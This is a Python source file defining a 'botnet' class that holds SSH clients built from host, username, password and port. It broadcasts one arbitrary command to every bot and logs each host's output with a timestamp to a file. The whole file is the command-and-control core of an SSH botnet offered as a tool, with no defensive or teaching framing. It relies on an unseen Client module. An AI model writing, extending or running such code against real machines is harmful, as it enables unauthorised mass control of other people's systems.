from datetime import date, datetime

from Client import Client


class botnet:
    def __init__(self):
        self.botnet = []
        self.f = open('Logs.txt', 'a')

    def addBot(self, host, user, passwd, por):
        if por != -1:
            client = Client(host, user, passwd, por)
            self.botnet.append(client)
        else:
            print('[-] ssh server not running on' + host)

    def sendCommandtoBot(self, cmd):
        self.f.write(" -> " + str(date.today().strftime("%B %d, %Y")) + " ( " + datetime.now().strftime(
            "%H:%M:%S") + ' ) ' + '\n\n')
        for client in self.botnet:
            outp = client.send_command(cmd)
            print(f'[*] Output from {client.host}')
            print(f'[+] {outp}')
            self.f.write(f'[*] Output from {client.host}\n')
            self.f.write(f'[+] {outp}\n')
        self.f.write('------------------------------\n')
